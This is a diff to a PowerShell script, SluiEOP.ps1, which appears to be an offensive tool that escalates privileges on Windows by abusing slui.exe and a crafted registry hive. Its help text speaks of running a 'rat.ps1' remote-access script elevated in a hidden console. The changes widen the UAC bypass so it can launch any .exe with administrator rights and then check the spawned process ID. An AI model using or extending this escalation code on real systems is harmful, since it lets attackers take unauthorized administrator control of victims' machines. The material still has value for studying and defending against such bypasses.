@@ -44,7 +44,7 @@
    Execute $Env:TMP\rat.ps1 script with high privileges (Admin) in an hidden console.
 
 .EXAMPLE
-   PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start mspaint.exe" -Force
+   PS C:\> .\SluiEOP.ps1 "powershel Start-Process mspaint.exe" -Force
    [-Force] EOP (create vuln HIVE bypassing vuln Checks) to Spawn mspaint with high privileges (Admin)
 
 .INPUTS
@@ -186,9 +186,13 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force"){
       }
    }
    ## [CMD|POWERSHELL|PYTHON] (scripts) - interpreters supported
-   ElseIf($Command -match '^[powershell]' -or $Command -match '^[cmd]' -or $Command -match '^[python]' -and $Command -match ' ' -and $Command -match '.ps1$' -or $Command -match '.bat$' -or $Command -match '.py$'){
+   ElseIf($Command -match '^[powershell]' -or $Command -match '^[cmd]' -or $Command -match '^[python]' -and $Command -match ' ' -and $Command -match '.ps1$' -or $Command -match '.bat$' -or $Command -match '.py$' -or $Command -match '.exe$'){
       ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
+      If($Command -match ' '){
+         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
+      }Else{
+         $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue      
+      }
       ## Extract powershell.exe interpreter process PID
       If($Command -match '^[powershell].*[.ps1]$'){
          $ProcessToken = "powershell.exe"
@@ -205,6 +209,13 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force"){
       ElseIf($Command -match '^[python].*[.py]$'){
          $ProcessToken = "python.exe"
          $ReturnCode = "2.2";$EOPID = Get-Process python -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
+      }
+      ## Extract binary.exe name
+      ElseIf($Command -match '[.exe]$'){
+         $ProcessToken = "$ProcessName"
+         $ReturnCode = "2.3";$ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True} 
       }
       Else{
